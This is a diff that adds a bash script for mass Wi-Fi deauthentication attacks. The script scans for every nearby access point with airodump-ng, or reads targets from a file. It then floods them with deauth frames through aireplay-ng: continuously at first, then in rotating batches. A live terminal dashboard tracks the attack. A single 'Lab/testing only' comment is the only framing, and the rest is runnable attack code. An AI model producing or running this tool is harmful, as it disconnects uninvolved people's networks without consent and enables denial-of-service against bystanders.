@@ -1,0 +1,205 @@
+#!/bin/bash
+# deauth-dashboard.sh
+# Ultimate passive, cached-channel deauth script with live terminal dashboard
+# Lab/testing only
+
+set -euo pipefail
+
+# ==============================
+# DEFAULT CONFIG
+# ==============================
+IFACE="wlan0"
+DEAUTH_COUNT=15
+MAX_BATCH=6
+SCAN_DURATION=15
+CHANNEL_HOP=true
+TARGETFILE=""
+AUTO_SCAN=false
+declare -A BSSID_CHANNELS
+declare -A BSSID_FRAMES
+declare -A BSSID_LASTHIT
+
+# ==============================
+# UTILS
+# ==============================
+log() {
+    echo "[$(date '+%F %T')] $*"
+}
+
+cleanup() {
+    sudo killall aireplay-ng 2>/dev/null || true
+    tput cnorm
+}
+trap cleanup EXIT
+
+check_iface_alive() {
+    ip link show "$IFACE" | grep -q "UP" || return 1
+    iw dev "$IFACE" info | grep -q "type monitor" || return 1
+    return 0
+}
+
+set_channel() {
+    local ch="$1"
+    [[ "$ch" -eq 0 ]] && return
+    sudo iw dev "$IFACE" set channel "$ch" 2>/dev/null
+}
+
+# ==============================
+# SCAN TARGETS
+# ==============================
+scan_targets() {
+    log "Starting passive scan with airodump-ng..."
+    TMP_FILE=$(mktemp)
+    sudo timeout "$SCAN_DURATION" airodump-ng --write-interval 1 --output-format csv -w "$TMP_FILE" "$IFACE" >/dev/null 2>&1
+
+    CSV_FILE="${TMP_FILE}-01.csv"
+    if [[ ! -f "$CSV_FILE" ]]; then
+        log "Airodump-ng did not produce CSV. Exiting."
+        exit 1
+    fi
+
+    while IFS=',' read -r bssid first_seen channel _rest; do
+        [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
+        BSSID_CHANNELS["$bssid"]="$channel"
+        BSSID_FRAMES["$bssid"]=0
+        BSSID_LASTHIT["$bssid"]=0
+    done < <(tail -n +2 "$CSV_FILE")
+
+    rm -f "$TMP_FILE"*  
+
+    if [[ ${#BSSID_CHANNELS[@]} -eq 0 ]]; then
+        log "No APs detected during passive scan. Exiting."
+        exit 1
+    fi
+
+    log "Passive scan complete. Found ${#BSSID_CHANNELS[@]} APs."
+}
+
+load_targets_from_file() {
+    if [[ ! -f "$TARGETFILE" ]]; then
+        echo "Target file $TARGETFILE not found."
+        exit 1
+    fi
+    while read -r line; do
+        [[ "$line" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
+        BSSID_CHANNELS["$line"]=0
+        BSSID_FRAMES["$line"]=0
+        BSSID_LASTHIT["$line"]=0
+    done < "$TARGETFILE"
+    log "Loaded ${#BSSID_CHANNELS[@]} BSSIDs from $TARGETFILE"
+}
+
+# ==============================
+# DASHBOARD
+# ==============================
+draw_dashboard() {
+    tput civis
+    while true; do
+        tput clear
+        echo "┌──────────────────────────── Wi-Fi Deauth Dashboard ─────────────────────────────┐"
+        echo "│ Interface: $IFACE   | Deauth: $DEAUTH_COUNT per hit | Max Batch: $MAX_BATCH"
+        echo "│ Channel Hopping: $CHANNEL_HOP | Total Targets: ${#BSSID_CHANNELS[@]}"
+        echo "├─────────────┬─────────────┬─────────────┬─────────────┬─────────────┬─────────────┤"
+        echo "│ BSSID       │ Channel     │ Status      │ Last Hit    │ Batch       │ Frames Sent │"
+        echo "├─────────────┼─────────────┼─────────────┼─────────────┼─────────────┼─────────────┤"
+        batch_count=1
+        for bssid in "${!BSSID_CHANNELS[@]}"; do
+            channel=${BSSID_CHANNELS[$bssid]}
+            last_hit=${BSSID_LASTHIT[$bssid]}
+            frames=${BSSID_FRAMES[$bssid]}
+            status="ACTIVE"
+            printf "│ %-11s │ %-11s │ %-11s │ %-11s │ %-11s │ %-11s │\n" "${bssid:0:11}…" "$channel" "$status" "$last_hit" "$batch_count" "$frames"
+            (( batch_count = batch_count < MAX_BATCH ? batch_count + 1 : 1 ))
+        done
+        echo "├────────────────────────────────────────────────────────────────────────────────────┤"
+        total_frames=0
+        for f in "${BSSID_FRAMES[@]}"; do (( total_frames+=f )); done
+        echo "│ Total Frames Sent: $total_frames"
+        echo "└────────────────────────────────────────────────────────────────────────────────────┘"
+        sleep 1
+    done
+}
+
+# ==============================
+# ATTACK LOGIC
+# ==============================
+attack_bssid() {
+    local bssid="$1"
+    local count="$2"
+    if $CHANNEL_HOP; then
+        set_channel "${BSSID_CHANNELS[$bssid]}"
+    fi
+    sudo aireplay-ng --deauth "$count" -a "$bssid" "$IFACE" >/dev/null 2>&1 &
+    BSSID_FRAMES[$bssid]=$(( BSSID_FRAMES[$bssid]+count ))
+    BSSID_LASTHIT[$bssid]=$(date '+%H:%M:%S')
+}
+
+parallel_mode() {
+    for bssid in "${!BSSID_CHANNELS[@]}"; do
+        attack_bssid "$bssid" 0
+    done
+    sleep 5
+    if check_iface_alive; then
+        log "Parallel mode stable. Ctrl+C to stop."
+        wait
+    else
+        log "Parallel mode failed. Switching to hybrid mode..."
+        cleanup
+        sleep 2
+        hybrid_mode
+    fi
+}
+
+hybrid_mode() {
+    log "Hybrid rotating mode started..."
+    local batch_size=$MAX_BATCH
+    local bssid_list=("${!BSSID_CHANNELS[@]}")
+    while true; do
+        for ((i=0; i<${#bssid_list[@]}; i+=batch_size)); do
+            for ((j=0; j<batch_size && i+j<${#bssid_list[@]}; j++)); do
+                attack_bssid "${bssid_list[$((i+j))]}" "$DEAUTH_COUNT"
+            done
+            sleep 1
+        done
+        if ! check_iface_alive; then
+            log "Interface down. Resetting..."
+            cleanup
+            ip link set "$IFACE" up
+            sleep 5
+            (( batch_size > 1 )) && (( batch_size-- ))
+        fi
+    done
+}
+
+# ==============================
+# ARG PARSING
+# ==============================
+while getopts "i:c:b:t:sn" opt; do
+    case $opt in
+        i) IFACE=$OPTARG ;;
+        c) DEAUTH_COUNT=$OPTARG ;;
+        b) MAX_BATCH=$OPTARG ;;
+        t) TARGETFILE=$OPTARG ;;
+        s) AUTO_SCAN=true ;;
+        n) CHANNEL_HOP=false ;;
+        *) echo "Usage: $0 [-i interface] [-c deauth_count] [-b max_batch] [-t target_file] [-s] [-n]"; exit 1 ;;
+    esac
+done
+
+# ==============================
+# LOAD TARGETS
+# ==============================
+if $AUTO_SCAN; then
+    scan_targets
+elif [[ -n "$TARGETFILE" ]]; then
+    load_targets_from_file
+else
+    echo "Error: No targets provided. Use -s (passive scan) or -t file.txt"
+    exit 1
+fi
+
+# ==============================
+# START DASHBOARD & ATTACKS
+# ==============================
+draw_dashboard &  # start dashboard in background
+parallel_mode
